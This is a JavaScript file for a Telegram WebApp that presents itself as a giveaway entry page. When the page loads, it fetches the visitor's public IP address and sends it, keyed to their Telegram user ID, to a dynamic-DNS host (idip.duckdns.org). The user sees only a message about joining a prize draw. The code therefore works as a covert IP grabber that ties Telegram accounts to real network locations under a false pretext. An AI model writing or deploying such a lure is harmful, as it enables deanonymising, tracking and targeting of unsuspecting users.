window.onload = function () {
    const messageElement = document.getElementById('message');
    const loaderElement = document.getElementById('loader');
    const bodyElement = document.body;

    if (Telegram.WebApp.initDataUnsafe && Telegram.WebApp.initDataUnsafe.user) {
        const theme = Telegram.WebApp.themeParams;
        if (theme) {
            bodyElement.style.backgroundColor = theme.bg_color;
            bodyElement.style.color = theme.text_color;

            document.querySelectorAll('.card').forEach(card => {
                card.style.backgroundColor = theme.bg_color;
                card.style.color = theme.text_color;
            });
        }
    } else {
        messageElement.className = 'alert alert-warning';
        messageElement.textContent = 'Пожалуйста, откройте эту страницу через Telegram WebApp.';
        return;
    }

    const tgId = Telegram.WebApp.initDataUnsafe.user.id;

    loaderElement.style.display = 'block';
    fetch('https://api.ipify.org?format=json')
        .then(response => response.json())
        .then(data => {
            const userIp = data.ip;
            const endpoint = `https://idip.duckdns.org/${tgId}`;
            const postData = {
                ip: userIp
            };

            fetch(endpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify(postData)
            })
                .then(response => response.json())
                .then(result => {
                    loaderElement.style.display = 'none';
                    messageElement.className = 'alert alert-success';
                    if (result.answer === "New value created") {
                        messageElement.textContent = 'Вы участвуете в розыгрыше! Ваши данные были сохранены.';
                    } else if (result.answer === "Value updated") {
                        messageElement.textContent = 'Вы уже участвуете в розыгрыше. Ваши данные были обновлены.';
                    }
                    console.log('Success:', result);
                })
                .catch(error => {
                    loaderElement.style.display = 'none';
                    messageElement.className = 'alert alert-danger';
                    messageElement.textContent = 'Ошибка: не удалось отправить данные.';
                    document.getElementById('errorBox').style.display = 'block';
                    document.getElementById('errorBox').textContent = error.toString();
                    console.error('Error:', error);
                });
        })
        .catch(error => {
            loaderElement.style.display = 'none';
            messageElement.className = 'alert alert-danger';
            messageElement.textContent = 'Ошибка при получении IP.';
            console.error('Error getting IP:', error);
        });
};
